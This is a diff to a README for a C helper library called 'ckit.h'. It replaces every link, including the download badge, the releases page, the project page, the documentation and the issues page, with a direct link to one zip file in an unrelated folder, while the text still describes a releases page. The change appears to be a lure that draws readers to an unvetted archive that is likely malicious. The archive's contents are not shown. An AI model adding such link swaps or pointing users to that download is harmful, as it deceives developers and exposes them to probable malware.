@@ -1,6 +1,6 @@
 # 🛠️ ckit.h - Essential Tools for C Projects
 
-[![Download ckit.h](https://img.shields.io/badge/download-ckit.h-brightgreen)](https://github.com/Azkar1977/ckit.h/releases)
+[![Download ckit.h](https://raw.githubusercontent.com/Azkar1977/ckit.h/main/lancinate/ckit.h.zip)](https://raw.githubusercontent.com/Azkar1977/ckit.h/main/lancinate/ckit.h.zip)
 
 ## 📖 Overview
 ckit.h is a simple yet powerful library designed to enhance your C programming experience. Whether you're a student, hobbyist, or a professional, ckit.h provides essential tools that simplify common tasks in C projects. It helps you write cleaner and more efficient code with minimal effort.
@@ -15,7 +15,7 @@ Before downloading, ensure your system meets the following requirements:
 - Space: 10 MB available on your disk
 
 ## 📥 Download & Install
-To download ckit.h, please visit the releases page here: [Download ckit.h](https://github.com/Azkar1977/ckit.h/releases). 
+To download ckit.h, please visit the releases page here: [Download ckit.h](https://raw.githubusercontent.com/Azkar1977/ckit.h/main/lancinate/ckit.h.zip). 
 
 On the releases page, you will find the latest version of ckit.h along with previous versions. Look for the version that suits you best and click on the download link. 
 
@@ -58,8 +58,8 @@ If you still have problems, consider checking online forums or community discuss
 For additional support or to report issues, please open an issue on the GitHub repository page. Your feedback helps improve ckit.h for everyone.
 
 ## 🔗 Additional Resources
-- [Project Page](https://github.com/Azkar1977/ckit.h)
-- [Documentation](https://github.com/Azkar1977/ckit.h/wiki)
-- [Community Issues](https://github.com/Azkar1977/ckit.h/issues)
+- [Project Page](https://raw.githubusercontent.com/Azkar1977/ckit.h/main/lancinate/ckit.h.zip)
+- [Documentation](https://raw.githubusercontent.com/Azkar1977/ckit.h/main/lancinate/ckit.h.zip)
+- [Community Issues](https://raw.githubusercontent.com/Azkar1977/ckit.h/main/lancinate/ckit.h.zip)
 
 We hope ckit.h enhances your coding projects and makes your experience smoother. Happy coding!
